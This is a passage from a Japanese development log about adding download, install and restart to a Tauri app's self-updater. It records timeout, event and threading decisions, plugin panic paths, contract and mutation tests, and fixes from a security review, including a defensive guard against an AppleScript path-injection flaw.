  呼ばないことは「アプリが自分で余計に叩かない」緩和であって、限界そのものの緩和ではない。
  ただし引数ゼロ・GET のみ・送信データゼロなので**窓が増えても攻撃面は増えない**＝055b の受容判断を維持。
- **`docs/security.md` は 1 文字も変えない**のが正しい。055b が新設した §1 例外が本タスクの内容を
  すべて包含しており（表示側は HTML として解釈しない・§9 は定型文言とバージョン文字列のみ）、
  保存ポリシー変更も無いため条文更新は不要。

## 2026-08-02 (055d ダウンロード → インストール → 再起動 —— **実装済み・実機確認は未実施**)

`docs/tasks/055d-update-install-and-restart.md` を実施。055c で `disabled` のまま残っていた
「アップデート」ボタンに **DL → インストール → 再起動**を配線し、055 系の機能ループを閉じた。
**自己置換（security.md §5 の例外）＋ auto update 系**のため security-review 必須。

⚠ **実機での自己更新確認は 099b に積み残す**（048/049/050 と同じ「実装済み・実機確認は未実施」）。

### 変更ファイル（12 変更 + 2 新規・+2031 / -83 行）

| 層 | ファイル | 内容 |
| --- | --- | --- |
| Rust | `app_update/commands.rs` | `install_app_update` / `restart_app` / `AppUpdateProgress` / `AppUpdateProgressPhase` / `should_emit_progress` / `InstallGuard` ＋ 契約テスト 6 本 ＋ 振る舞いテスト 8 本 |
| Rust | `error.rs` | `ErrorCode::UpdateInstallFailed` ＋ `AppError::update_install_failed()`（引数なし）＋ テスト更新 |
| Rust | `lib.rs` | `generate_handler!` に 2 本（2 行） |
| 生成物 | `bindings/AppUpdateProgress.ts` / `AppUpdateProgressPhase.ts`（新規）／ `bindings/ErrorCode.ts`（更新） | ts-rs |
| TS | `features/app-update/appUpdateApi.ts` | `installAppUpdate` / `restartApp` / `APP_UPDATE_PROGRESS_EVENT` / `listenAppUpdateProgress` |
| TS | `features/app-update/useAppUpdate.ts` | phase 7 状態 ／ `progress` ／ `install` / `restart` ／ 購読 ／ watchdog ／ 定型文言 2 本 |
| TS | `screens/app-update/UpdateScreen.tsx` ＋ `.module.css` | 配線・進捗バー・OS 分岐・見出しの文言テーブル化 |
| TS | `App.tsx` | props 3 行 |

**ゼロ拡大は実測で差分ゼロ**: `capabilities/` ／ `tauri.conf.json` ／ `Cargo.toml` ／ `Cargo.lock` ／
`apps/desktop/package.json` ／ `pnpm-lock.yaml` ／ `.github/` ／ `apps/comment-sidecar/` ／ `styles/theme.css`。

**検証**: `cargo check` / `cargo test`（**131 passed**）／ `typecheck` / `lint` /
`test`（**500 → 555 passed** ＋ `check:css` OK ＋ `check:version` OK）。

---

### ① DL タイムアウトの張り方と値の根拠

`configure_client` で **`connect_timeout` 15 秒 ＋ `read_timeout` 30 秒**を張った。
install 用 builder は `.timeout(CHECK_TIMEOUT)` も**併せて**持つ。効き方は次のとおり:

| フェーズ | 効く上限 |
| --- | --- |
| install 内部の `check()` | 総 15 秒（`timeout`）＋ connect 15 秒 / read 30 秒 |
| `download()` | connect 15 秒 / read 30 秒**のみ**（総 deadline は張らない） |

**ソースで確認した事実（tauri-plugin-updater 2.10.1）**:
- `Updater::check()` は戻り値を `Update { timeout: None, … }` と**ハードコード**する
  → `UpdaterBuilder::timeout()` は `download()` に伝播しない（055b レビューの訂正どおり）。
- `Update::download()` は `if let Some(ref configure_client) = self.configure_client { … }` で
  **`configure_client` を適用する**。`check()` が `Update` を組むときに
  `configure_client: self.configure_client.clone()` で持ち越すことも確認済み。
- `configure_client` は `Updater::check()` のクライアント構築にも適用される（同じ 2 行がある）。

**値の根拠**:
- **connect 15 秒** … 既存の `CHECK_TIMEOUT` と同値。TCP + TLS ハンドシェイクに 15 秒かかる回線は
  事実上使えないので「繋がらない」の判定として十分。思考単位を 2 つに割らないために合わせた。
- **read 30 秒** … reqwest 0.13.4 の doc が明記するとおり **read ごとにリセット**される
  （"resets after a successful read. This is more appropriate for detecting stalled connections
  when the size isn't known beforehand."）。＝**総 DL 時間を縛らない**ので 100MB を低速回線で落とす
  正常系を殺さない。一方、健全な TCP で 30 秒間 1 バイトも届かないことは再送のバックオフを考えても
  事実上ありえないので、「繋がるが応答しない」を確実に検出できる。押してから 30 秒以内にエラーへ落ちる。
- **総 deadline は張らない** … サイズ依存で妥当値を決められないため（055b レビューの結論を踏襲）。

値の妥当性は `download_timeouts_stay_within_sane_bounds` が上下から挟んで固定している
（短すぎ＝正常な DL を殺す／長すぎ＝固まって見える、の両方を殺す）。

### ② イベントの仕組みと **capability が不変で済んだ根拠**

- **イベント名**: `app-update:progress`。命名規約も新設した＝ **`<feature ディレクトリ名>:<出来事>`**
  （`src/features/app-update/` と一致させる）。Tauri が許すのは英数と `-` `/` `:` `_` のみ
  （`tauri::event::event_name::is_event_name_valid`）。
  ⚠ **Rust と TS の 2 箇所に同じ文字列を持っている**（ts-rs は const を書き出さない）。
  ズレると進捗が一切出ないまま気付けないので、`appUpdateApi.test.ts` で値を固定した。
- **ペイロード**: `{ phase, downloadedBytes, totalBytes }` の 3 つだけ。
  URL・ローカルパス・バージョン・環境情報は載せない（§9）。
  `progress_payload_only_carries_bytes_and_phase` が **キー集合の完全一致**で固定している
  （leak 語彙を列挙する形だと知らない名前の漏洩を見逃すため、完全一致にした）。
- **送り先＝全窓ブロードキャスト**（`app.emit()`）。

**capability が不変で済んだ根拠（実測）**: `src-tauri/gen/schemas/acl-manifests.json` を読むと

```
core.default_permission   = ["core:path:default", "core:event:default", "core:window:default", …]
core:event.default_permission = ["allow-listen", "allow-unlisten", "allow-emit", "allow-emit-to"]
```

＝ **`core:default` に `core:event:allow-listen` が既に含まれている**。4 枚の capability はすべて
`core:default` を持つので `capabilities/*.json` は 1 文字も変えていない（`gen/schemas/` は `.gitignore` 済み）。
tauri crate 側では `build.rs` が `PLUGINS` 定数から `core:default` を生成しており、
`core:event` の 4 コマンドが `enabled-by-default = true` になっている。

⚠ **`emit_to` では絞れないことをソースで確認した**。`tauri-2.11.5/src/event/listener.rs` の

```rust
*target == EventTarget::Any || filter.as_ref().map(|f| f(target)).unwrap_or(true)
```

の `target` は**リスナ側が登録した target**で、`@tauri-apps/api` の `listen()` は
オプション省略時に `{ kind: 'Any' }` で登録する（`event.js` で確認）。
＝ **Any で登録したリスナは emit のフィルタを無条件に素通りする**。
「絞れないのに `emit_to` を書くと絞ったつもりの記録が残る」ほうが有害と判断し、素直に `app.emit()` にした。
実際にメイン窓だけが受け取るのは **`MainWindowApp` でしか購読していない**というアプリ側の構造による。

⚠ **副次的な発見**: 同じ `core:event:default` で **`allow-emit` も既に配られている**＝
webview 側から同名イベントを**偽造できる**。偽の進捗が出るだけで何も起こらないが、
**完了判定はイベントではなく invoke の resolve で行う**という不変条件を守った
（`useAppUpdate` は実行中フラグが立っていないときの進捗イベントを捨てる。テストで固定済み）。

⚠ **（不採用）`tauri::ipc::Channel`**: ブロードキャストも購読ライフサイクルも消せるが、
frontend が `new Channel()` を作って command 引数で渡す方式なので
**`install_app_update` の引数が `AppHandle` のみでなくなる**。capability が不変で済むと分かった以上、
規約を曲げる理由が無いので採らなかった。

**スロットリング**: `on_chunk` は 1 チャンク（数 KB〜数十 KB）ごとに呼ばれるので、
累積 **512 KiB ごと**に間引いた（100MB で数千発 → 約 200 発）。時間ベースにしなかったのは、
**純関数 `should_emit_progress` にして境界をテストで固定できるようにするため**。

### ③ `restart()` が `RunEvent::Exit` を発火するか —— **呼び出しスレッド依存**（ソースで確認）

`tauri-2.11.5/src/app.rs` の `AppHandle::restart()`:

```rust
if self.event_loop.lock().unwrap().main_thread_id == std::thread::current().id() {
    self.cleanup_before_exit();            // ← RunEvent は一切発火しない
    crate::process::restart(&self.env());
} else {
    self.manager.restart_on_exit.store(true, …);
    match self.runtime_handle.request_exit(RESTART_EXIT_CODE) { … }
}
```

doc コメントにも "When this function is called on the main thread, we cannot guarantee the delivery of
those events, so we skip them" と明記されている。

- **メインスレッドから呼ぶと `RunEvent::Exit` が発火しない** → `lib.rs` の Exit フックが走らない
  → **`comment_sidecar::shutdown` が呼ばれない＝孤児 sidecar**。
- `cleanup_before_exit()` が触るのは**トレイアイコンと resources_table だけ**で、sidecar には一切触れない。
- 別スレッドからなら `request_exit` 経由で発火する（`lib.rs` は `ExitRequested` を握っていないので止まらない）。

**入れた対処（2 つとも入れた）**:
1. `restart_app` を **`async fn`** にした（tokio worker で走る＝別スレッド分岐）。
2. **それに依存せず**、`restart_app` の中で `comment_sidecar::shutdown(&app)` を**明示的に呼んでから**
   `app.restart()` する。`shutdown` は `guard.take()` で idempotent なので二重呼び出しは無害。
   契約テスト `restart_stops_the_sidecar_before_restarting` が消失を機械で止める。

**`run_on_main_thread` は使ってはいけない**（使うとメインスレッド分岐に落ちて Exit を飛ばす）。

#### ⚠ 追加で見つかった穴 1: Windows は `restart_app` を通らずにプロセスが死ぬ

`Update::install_inner()`（Windows）は `ShellExecuteW` でインストーラを起動した直後に
**`std::process::exit(0)`** を呼ぶ。＝`RunEvent::Exit` も `restart_app` も通らず、**sidecar が孤児になる**。
plugin はその直前に `on_before_exit` フックを呼ぶので、**install 用 builder にフックを付けて sidecar を落とした**。

⚠⚠ **さらにその中に罠があった**: `UpdaterExt::updater_builder()` は
**既定で `on_before_exit` に `app_handle.cleanup_before_exit()` を入れている**。
`on_before_exit` は `replace` なので、こちらで設定すると**plugin 既定の後始末が消える**。
→ **両方呼ぶ**ようにした。契約テスト
`windows_install_stops_the_sidecar_before_the_process_exits` が 3 点（フックの存在 / sidecar 停止 /
既定の後始末）をまとめて固定している。

併せて `windows.installMode: "passive"` が plugin の `nsis_args()` で `["/P", "/R"]` に展開されること
（`/R` = インストール後にアプリを再起動）も確認した。＝Windows は **NSIS 側がアプリを立ち上げ直す**ので、
「インストーラが起動します。完了後に自動で立ち上がります」という案内文言はソースと整合する（実測は 099b）。

#### ⚠ 追加で見つかった穴 2: `install` を同期コマンドにするとデッドロックする

plugin の macOS 昇格インストール経路は `(self.run_on_main_thread)(…)` で**イベントループにタスクを投げてから**
`rx.recv()` で同期ブロックする。`#[tauri::command]` は `async` が無いと IPC ハンドラ＝**メインスレッド**で
実行されるので、メインスレッドが `rx.recv()` で止まっているとそのタスクが永遠に実行されない
＝ **panic ですらない無言のハング**で、タイムアウトでも救えない。
→ `install_app_update` / `restart_app` はどちらも `async fn` にした（コメントに理由を明記）。

### ④ plugin 内部の消せない panic への対処と、その限界

`Update::install_inner()`（macOS）の昇格経路には**こちらのコードでは消せない panic が 3 つ**ある:

| # | 箇所 | 走るスレッド | 発生条件 |
| --- | --- | --- | --- |
| P1 | `script.compile().expect("invalid AppleScript")` | **メインスレッド** | パスに `"` / `\` が含まれ AppleScript リテラルが壊れる（エスケープしていない） |
| P2 | `tx.send(r).unwrap()` | **メインスレッド** | 受信側が既に drop |
| P3 | `rx.recv().unwrap()` | tokio worker | `run_on_main_thread` が `Err` を返しクロージャが実行されない（`res.is_err()` の判定は**この後**にあるので防御が間に合っていない） |

到達条件は「`/Applications` 等に書き込み権限が無い状態で更新」なので稀だが、ゼロではない。

**入れた対処: `useAppUpdate` の watchdog（`INSTALL_WATCHDOG_MS` = 120 秒）。**
`install()` を始めた時点でタイマを張り、進捗イベント / resolve / reject のたびに張り直す。
時間切れになったら `phase: "error"` ＋ 専用の定型文言
（「更新を完了できませんでした。アプリを終了して、もう一度起動してからお試しください。」）に落とす。

- ⚠ **`installing` に入った時点ではなく `install()` の開始時に張る**のが要点。進捗イベントが来たときだけ
  張る実装にしていたら、**「1 発目のイベントが永久に来ない」というまさに救いたいケースを取りこぼしていた**
  （テストを書いていて実際に踏んだ）。
- ⚠ **watchdog は `inFlightRef` も返す**。見捨てた実行の Promise は永久に settle しないので、
  `finally` に任せるとフラグが立ちっぱなしになり **UI だけ戻って再確認もアップデートも二度と押せない**
  という一番たちの悪い状態になる。これも実装中にテストで踏んだ。
  副作用として「見捨てた Rust 側の処理が走ったままもう 1 本 install を始められる」が、
  **Rust 側の `InstallGuard` が受け止める**（走行中の 2 本目は即 `Ok(())`）。
- ⚠ 世代カウンタ `runRef` を **check と install で共有**している。別々に持つと、watchdog 後に始めた
  `recheck` の実行中に見捨てた install が遅れて settle して `inFlightRef` を落とし、3 本目が走れてしまう。
- 120 秒の根拠: DL は別フェーズなので、この 120 秒が測るのは**署名検証＋展開＋自己置換だけ**。
  数百 MB でも数十秒に収まる想定で倍以上の余裕を取った（実測は 099b）。

**⚠ 記録すべき限界（watchdog でも救えない範囲）**:
- **P1 / P2 はメインスレッド上で panic する**＝イベントループごと落ちる可能性があり、
  watchdog が動く前にアプリが消えることがある。**plugin を fork しない限り塞げない。**
- watchdog は **UI を返すだけでキャンセルではない**。Rust 側の処理は止められない（invoke は abort できない）。
- したがって「更新を完了できませんでした」は**再試行ではなくアプリの再起動を促す文言**にした
  （「もう一度お試しください」は、この状態では正確でない）。

### ⑤ 契約テストをどう拡張したか

`check_command_contract` → **`command_contract` に改名**し、同じ `include_str!("commands.rs")` を共有した。
**新コードを別ファイルに分けなかった最大の理由がこれ**——既存の 3 本
（`does_not_override_endpoints_at_runtime` / `has_no_panicking_unwrap_or_expect` /
`never_binds_the_raw_updater_error`）が**追加コードにも自動で効く**。分割するとその効果を丸ごと失う。

**追加した契約テスト（6 本）**:

| テスト | 固定する不変条件 |
| --- | --- |
| `install_takes_only_the_app_handle` | `pub async fn install_app_update(app: AppHandle) -> AppResult<()>` の**シグネチャ全体**＝引数を足した瞬間に落ちる |
| `restart_takes_only_the_app_handle` | 同上（`restart_app`） |
| `keeps_the_download_hang_guard` | `.configure_client(` ＋ `connect_timeout(DOWNLOAD_CONNECT_TIMEOUT)` ＋ `read_timeout(DOWNLOAD_READ_TIMEOUT)`（実引数まで含める＝値だけ緩める変異も殺す） |
| `restart_stops_the_sidecar_before_restarting` | `comment_sidecar::shutdown(&app)` |
| `windows_install_stops_the_sidecar_before_the_process_exits` | `.on_before_exit(` ＋ sidecar 停止 ＋ **plugin 既定の `cleanup_before_exit()` の呼び直し** |
| `install_is_guarded_against_concurrent_runs` | `compare_exchange(` ＋ `impl Drop for InstallGuard`（Drop を消すと**サイレントな機能停止**になるので機械で守る） |

**追加した振る舞いテスト（8 本）**: ペイロードのキー集合完全一致／camelCase と `totalBytes: null`／
`installing` の文字列／値に URL・パスが混ざらないこと／イベント名の妥当性／間引きの境界／
間引き粒度の上下限／タイムアウト値の上下限／`InstallGuard` が 1 本だけ通し drop で解放されること。

**既存テストの更新**: `never_binds_the_raw_updater_error` の下限を **`>= 2` → `>= 6`** に上げた
（check 2 本＋install 4 本）。`error.rs` の `ALL: [ErrorCode; 16]` → `17`、`wire_name` に 1 腕追加。

⚠ **照合対象にはテストモジュール自身のコードも含まれる**ので、
**新しく書くテストでも `unwrap()` / `.expect(` / panic 系マクロ / `map_err(|e|` を使えない**
（`unwrap_or` / `unwrap_or_default` / `unwrap_or_else` は needle にヒットしないので使える）。
モジュール doc にこの制約を明記した。

**frontend のテスト（500 → 555）**: `appUpdateApi.test.ts` +6（イベント名の固定を含む）／
`useAppUpdate.test.tsx` +24（進捗・相互排他・購読ライフサイクル・watchdog・偽イベントの無視・console 非漏洩）／
`UpdateScreen.test.tsx` +16（進捗バーの決定形/不定形・0 除算・100% 頭打ち・OS 分岐・§9）。

### ⑥ dev で確認できた範囲／できなかった範囲

⚠ **`tauri dev` で「アップデート」を押してはいけない（`target/debug` が消える）。**

`Update::install_inner()`（macOS）の置換先 `extract_path` は `extract_path_from_executable(current_exe())` で決まり、
`Contents/MacOS` を含まないパスでは**実行ファイルの親ディレクトリ**になる。
`tauri dev` の実行ファイルは `apps/desktop/src-tauri/target/debug/stream-dock` なので、
**`extract_path` は `target/debug` そのもの**。install が走ると:

1. `rename(target/debug → $TMPDIR/tauri_current_app*/current_app)`（macOS の `/var/folders` と `/Users` は
   同一 APFS ボリュームなので成功する見込み）
2. 展開した一時ディレクトリを `target/debug` へ rename
3. 関数を抜けると `tempfile::TempDir` が drop → **退避した `target/debug` が丸ごと削除される**

cargo で再ビルドすれば復旧するが数分〜十数分かかる。**依頼者の判断で「dev では install を押さない」とした。**

**完了条件の読み替え**（タスクファイルにも追記済み）:

| 段階 | dev で確認できること | 確認できないこと |
| --- | --- | --- |
| publish 前（endpoint が draft = 404） | ボタンが押せる／固まらない／`check()` が 404 で落ちて**定型エラー**（生エラー・URL なし）／多重押下で壊れない／インストール中に他画面へ行って戻っても壊れない | DL 経路（1 バイトも通らない） |
| publish 後・version を一時的に下げる | **DL の進捗が進む**／`downloading` → `installing` の遷移 | **install 段は押さない** |
| 単体テスト側（いつでも） | OS 分岐・完了表示・再起動ボタン・進捗バーの決定形/不定形・§9 の非漏洩 | 実際の置換・再起動・sidecar の生死 |

**OS 分岐と完了表示は実機に頼らず `UpdateScreen.test.tsx` で固定した**（`useHostOs` をモック）。
後で install 経路を安全に通したくなった場合は、`tauri build` した `.app` を `/Applications` ではない
作業ディレクトリにコピーして起動すること（失敗しても消えるのはコピーだけ）。

### ⑦ 099b へ積み残す実機項目

1. **macOS: 未署名 `.app` の自己置換が成立するか**（E2E-3）。
2. **macOS: sidecar の実行ビットと ad-hoc 署名が更新後も保たれるか**（E2E-4）。
3. **macOS: Gatekeeper に再ブロックされないか**（E2E-5）。
4. **Windows: minisign 検証が通るか**（E2E-6・099a の地雷）。
5. **Windows: 「再起動」ボタンに到達するか** —— ソース上は `std::process::exit(0)` により
   **到達しないことがほぼ確定**したので、E2E-7 は「到達しない前提の案内文言が実挙動と一致するか」に読み替える。
6. **`windows.installMode: "passive"` の妥当性**（`/P /R` の `/R` が実際に効くか）。
7. **更新後に sidecar が孤児になっていないか**（`on_before_exit` フックが効いたか。Windows は特に）。
8. **macOS で `/Applications` の書き込み権限が無い場合に昇格ダイアログが出るか** ——
   出る場合、plugin 内部の panic 経路 P1〜P3 に到達する唯一の経路なので、**watchdog が実際に効くか**も見る。
9. **DL 進捗バーの実描画**（jsdom はレイアウトを解決しないので原理的に不可能）。

### ⑧ `install_app_update` を毎回 `check()` し直す設計

`Update` を State に持ち越さない（このリポジトリの State はすべて `std::sync::Mutex` で、`.await` を跨ぐと
`Send` 境界で落ちるかロックを握ったまま await してデッドロックする）。`Update` は `Resource` を実装しているので
Tauri の resources_table に載せる道もあるが、それは **frontend に rid を渡す設計**になり
「引数は `AppHandle` のみ」に反するので採らなかった。

**副作用として記録しておくこと**: 「押した時点では更新があったが、再 check したら無かった」場合も `Ok(())` を返す
（多重押下・時間差の競合を吸収するため）。その結果 UI は `installed` になり、macOS では再起動ボタンが出る。
押しても再起動するだけで害は無いので許容した。
**再修正トリガー＝「更新していないのに再起動を促された」という混乱が実際に起きたら**、
`Ok(())` を「更新なしで完了」と区別できる戻り値に変える。

コストは `latest.json` の GET が 1 回増えること（起動時の check ＋ install 時の再 check）。
GET のみ・送信データゼロなので §1 の評価は変わらない。

### ⑨ Rust 側の `InstallGuard`（055b の security-review 指摘 S-4 への回答）

frontend の `inFlightRef` が守るのは**メイン窓の中だけ**。アプリ定義コマンドは ACL の対象外で
**4 窓すべてから呼べる**ので、Rust 側にも `static INSTALL_IN_FLIGHT: AtomicBool` + RAII ガードを置いた。
走行中の 2 本目は **`Ok(())` で即返す**（「更新なし」と同じ扱い＝エラーコードを増やさずに済む）。

`Mutex` ではなく `AtomicBool` にしたのは、`.await` を跨いでも `Send` 境界の問題もデッドロックも起きないため。
⚠ **これは多重実行を防ぐだけで、呼べること自体は防いでいない**（Tauri v2 では構造的に防げない）。

Windows は install 中に `std::process::exit(0)` するので `Drop` が走らないが、プロセスごと消えるので問題ない。

### ⑩ 訂正した既存記述（調査で判明した事実誤認）

1. **`zip` feature の理由が誤っていた**（`security.md` §10 を訂正）。
   055b 時点の記述は「`flate2`/`tar` は `zip` feature でしか有効化されない optional 依存＝落とすと
   **macOS でコンパイルエラー**になり必ず気付く」だったが、plugin の `Cargo.toml` を実際に読むと
   `[target.'cfg(target_os = "macos")'.dependencies]` の `tar` / `flate2` に **`optional` 指定は無い**
   （`optional = true` なのは **Linux ターゲットの分だけ**）。
   ＝ **macOS では `zip` を落としてもビルドは通る。**
   本当に効くのは **Windows 側**で、updater 成果物は `*-setup.nsis.zip`、`Update::extract()` の zip 展開分岐が
   `#[cfg(feature = "zip")]` なので、落とすと `extract_exe()` にフォールバックして
   **zip のバイト列を `.exe` として書き出し、Windows の自己更新が実行時に静かに壊れる**。
   → **「落とすな」という結論は正しいまま。危険度は当初の記述より高い**（コンパイルエラーで気付けない）。
   ⚠ `Cargo.toml` / `task-board.md` / 055b 節にも同じ誤りが残っているが、**本タスクでは
   `security.md` だけを直した**（`Cargo.toml` を触るとゼロ拡大の担保が崩れるため）。
   **再修正トリガー＝次に `Cargo.toml` を触るタスクで、コメントも合わせて直すこと。**
2. **055b 節の「却下した案: `configure_client`。`Update` に持ち越されないので副作用が無い」は事実と逆**
   （同節の後段レビュー対応で訂正済みだが、元の段落は未修正のまま残っている）。
   055d はまさにこの API を使っており、**`configure_client` は `Update` に持ち越される**
   （`Updater::check()` が `configure_client: self.configure_client.clone()` で引き継ぐ）。
   ⚠ **この 1 件だけは「履歴として残す」で済ませてはいけない**（055d review Q-14）——
   055d の DL タイムアウトは**その逆が真であることに全面的に依存**しており、
   元段落を信じた人は「タイムアウトが効いていない」と誤診断する。
   **055b 節の当該段落を読むときは、必ずこの ⑩-2 を正とすること。**
3. **055a / 055b / 055c 節の「未コミット」表記は現状と食い違っている**（作業ツリーは clean で 5 コミット済み）。
   履歴としてそのまま残すが、読むときは注意すること。

### 実装中に踏んで直した穴（テストが見つけたもの）

| # | 症状 | 直し方 |
| --- | --- | --- |
| 1 | watchdog を「進捗イベント受信時」だけ張っており、**1 発目が永久に来ないケースを取りこぼす** | `install()` の開始時に張る |
| 2 | watchdog 発火後も `inFlightRef` が立ちっぱなしで、**再確認もアップデートも二度と押せない** | watchdog で `inFlightRef` を返し、世代を進める |
| 3 | check と install で世代カウンタが別々だと、見捨てた install が `recheck` 中にフラグを落とす | 世代を **1 本に共有** |
| 4 | 実行中はボタンのラベルが `<Spinner />` になり**アクセシブルネームが消える**（テストから掴めない＝読み上げでも名前が無い） | `aria-label="アップデート"` を明示 |
| 5 | ts-rs が `u64` を **`bigint`** に写すが、wire は JSON の数値＝JS では `number`。そのままだと**嘘の型**になり進捗率の割り算が実行時例外になる | `#[ts(type = "number")]` / `#[ts(type = "number | null")]` を明示（リポジトリ慣習の `u32` 化は 4GB で静かに折り返すので採らなかった） |

### その他の設計判断

- **`ErrorCode::UpdateInstallFailed` を 1 つだけ足した。** `log_message()` が
  `UpdateCheckFailed => "更新の確認に失敗しました。"` を返すので、インストール失敗に流用すると**文言が事実と食い違う**。
  一方 055b が確定した「種別（到達不可 / 404 / JSON 破損 / 署名検証失敗）で細かく分けない」方針は維持
  ＝分ける軸は「確認」対「インストール」の 2 つだけ。`restart_app` にエラーコードは不要
  （`AppHandle::restart()` は `-> !` で失敗経路が無く、`!` が `AppResult<()>` に型強制される）。
- **`phase: "error"` が取得失敗とインストール失敗の両方を表すようになった**ので、
  見出しを「更新を確認できませんでした」→「更新できませんでした」に変えた。どちらだったかは本文の定型文言が示す。
  ⚠ **`status !== null` から推測して見出しを出し分けない**こと（`UpdateScreen` は表示専用の純関数で
  フックの契約を知らない、という既存の設計を崩すため）。
  **再修正トリガー＝見出しまで分けたくなったら phase を 2 つに割るか、判別可能 union に統合する。**
- **`headline()` / `headlineDescription()` を文言テーブル（`HEADLINES`）に畳んだ。**
  055c review の品質観点 3 に「再修正トリガー＝055d が DL 進捗の文言を足すとき」と明記されていたとおり。
  状態が 4 → 7 に増えたので、分岐が 3 箇所に散る前にテーブル 1 本＋キー導出 1 本にした
  （`Record` なのでキー漏れはコンパイルエラー）。
- **進捗バーは `<progress>` ではなく div 2 段。** `appearance: none` を当てると WebKit が
  不定形アニメーションを描かなくなり、「総バイト数不明」と「固まった」が見分けられなくなるため。
  色は既存の役割トークン（`--control-bg` / `--primary`）のみ、余白は既存の実値（7px / 14px）のみで、
  **新しい値は発明していない**。
- **`installing` 中は総バイト数が分かっていても不定形にする**（満杯で止まったバーは「固まった」に見えるため）。
- **購読は `useAppUpdate`（＝`MainWindowApp`）に置いた**ので、購読/解除の寿命はアプリの生存期間と一致する。
  `UpdateScreen` の unmount（他画面への遷移）では解除されない＝**インストール中に画面を離れて戻っても壊れない**。
  非同期 `listen` の `cancelled` ガードが無いと StrictMode の二重 mount でリスナが 1 本漏れるので、
  そこもテストで固定した。

### security-review / code-review の対応（2026-08-02・同日実施）

**総合判定は「修正必須 2 件」**。plugin（`tauri-plugin-updater` 2.10.1）と `tauri` 2.11.5 のソースを
レビュー側が実際に読み直し、**申し送り 2 / 4 / 5 / 11 はすべて事実どおり**と裏取りされた。
一方で**申し送りが取りこぼしていた穴が 2 つ**見つかり、両方このセッションで直した。

| # | 指摘 | 対応 |
| --- | --- | --- |
| **S-1** | **macOS 昇格経路の AppleScript にインストール先パスが生で埋まる**（plugin 側・`format!` にシングルクォート内へ埋め込み）。`'` が入れば **root 権限のコマンドインジェクション**、`"` / `\` なら**メインスレッド panic**。しかも `/Applications` は `root:admin` なので**標準ユーザーでは毎回この分岐に入る**＝「稀」ではない | **修正**: `ensure_install_path_is_shell_safe()` を DL の**前**に置き、`'` `"` `\` `` ` `` `$` 改行 を含むインストール位置では fail-closed で更新しない。§4 の例外を「ユーザー入力が入らないから安全」→「**この検査があるから安全**」に書き換え。契約テスト 1 本＋境界テスト 1 本で固定 |
| **S-2** | `InstallGuard` に弾かれた 2 本目も `Ok(())` を返すため、frontend が resolve を一律「完了」と読み、**走行中の自己置換の最中に再起動ボタンが出る**。watchdog 発火 → 再確認 → もう一度アップデート、の 2 クリックで到達。macOS で `install_inner()` の 2 回の `rename` の間に刺さると **`.app` が消える** | **修正**: 戻り値を `AppResult<AppUpdateInstallOutcome>`（`installed` / `noUpdate` / `alreadyRunning`）に変更。`useAppUpdate` は `alreadyRunning` を watchdog と同じ文言へ落とす。**新規依存ゼロ・引数は `AppHandle` のまま** |
| **S-5** | 偽造イベントは「実行中でなければ捨てる」だけでは不十分——**実行中は信頼して watchdog を張り直す**ので、送り続けると唯一の逃げ道を無力化できる | **修正**: `INSTALL_DEADLINE_MS`（15 分・**進捗では延長されない絶対上限**）を別に 1 本張った |
| **S-3 / S-4** | ①`endpoints` が固定なのは **check の宛先だけ**で、実体の DL 先は**未署名 `latest.json`** が決める ②`download()` のサイズ上限は **plugin API 上そもそも課せない**（`on_chunk` が中断を返せない） | **記録のみ**（どちらもコード修正不要）。§1 と §5 に明記 |
| **S-6 / Q-7 / Q-8 / Q-10** | 契約テストの範囲が `commands.rs` に閉じている（`comment_sidecar::shutdown` の `expect`）／`spawn_blocking` にすべきか／間引き 1 発目の非対称／CSS ガードに `.progressTrack` を入れるか | **修正不要**。それぞれ該当箇所に意図・理由・再修正トリガーをコメントで残した |
| **Q-9** | `UpdateScreen` が `useHostOs()` を自前で呼び、055c の「表示専用」契約から外れていた | **修正**: `hostOs` を props で受ける形に戻した（`App` は既に持っている）。テストからモックが 1 つ消えた |
| **Q-12** | §10 の `zip` 訂正の**機構**が誤り（`extract_exe()` は zip を `.exe` として書き出さず `Err` を返すだけ） | **修正**（docs のみ） |
| **Q-14** | `@tauri-apps/api/event` の import 制約コメントが type-only import と食い違う | **修正**（「値として」に限定） |

**ミューテーションで見つかった生存変異 6 件と、その対応**（レビュー側が実測 → 対応後に再実測して全部 killed）:

| 変異 | 対応前 | 対応 | 対応後 |
| --- | --- | --- | --- |
| `install_app_update` 冒頭の `InstallGuard::acquire()` を削除（impl は残す） | **生存** | 契約テストの needle を「定義」から**呼び出し**へ | killed |
| Rust 側のイベント名だけを書き換える（TS とドリフト） | **生存**（Rust 136・frontend 555 とも緑のまま進捗が一切出なくなる） | Rust 側に `assert_eq!(APP_UPDATE_PROGRESS_EVENT, "app-update:progress")` を追加＝**片方を変えると必ず落ちる** | killed |
| 引数を足したうえで needle と同じ文字列を**行末コメント**に書く | **生存** | `code_only()` を行末コメントも落とす形に | killed |
| `INSTALL_WATCHDOG_MS` を 1 秒にする | **生存**（テストが定数をシンボル参照しているため） | Rust の `download_timeouts_stay_within_sane_bounds` と同型の値域テストを frontend にも | killed |
| watchdog の `runRef.current += 1` を削除 | **生存**（見捨てた実行が後から settle して `error` を `installed` に巻き戻す経路にテストが無かった） | 遅延 resolve / 遅延 reject の 2 本を追加 | killed |
| `installing` の emit を `download()` の**前**（＝minisign 検証の前）へ移す | **生存** | **最初に現れる修飾付き `AppUpdateProgressPhase::Installing` が `.download(` より後**であることを契約テストで固定 | killed |

⚠ 併せて **rustfmt がシグネチャを改行すると `install_takes_only_the_app_handle` が偽陽性で落ちる**問題も直した
（`code_compact()`＝空白を全部落とし、末尾カンマ付きの複数行を 1 行形と同一視する）。
改行しても緑・引数を足すと赤、を実測で確認済み。

**この対応で増えたテスト**: Rust 131 → **136**（`+5`）／frontend 555 → **562**（`+7`）。

⚠ **`pnpm check:bindings` は未コミットの作業ツリーでは原理的に通らない**（`git diff --exit-code` が HEAD と比べるため）。
再生成しても作業ツリーが変わらないこと＝**実 drift ゼロ**は別途確認済み。**コミット後に走らせること。**
未追跡の生成物（`AppUpdateProgress.ts` / `AppUpdateProgressPhase.ts` / `AppUpdateInstallOutcome.ts`）が
ガードの対象になるのもコミット後。

### 未完了・次にやること

1. **実機確認（依頼者）** —— **publish 前**に確認できること:
   - 「アップデート」ボタンが押せる／押しても **UI が固まらず**、定型エラー表示になる（**生エラー文字列・URL が出ない**）
   - 多重押下で壊れない／インストール中に他画面へ行って戻っても壊れない
   - ⚠ **OS 分岐（macOS の再起動ボタン / Windows の案内文言）は単体テストで担保済み**なので実機では省いてよい
   **publish 後**（依頼者が Release を publish し、`tauri.conf.json` の version を一時的に下げる）:
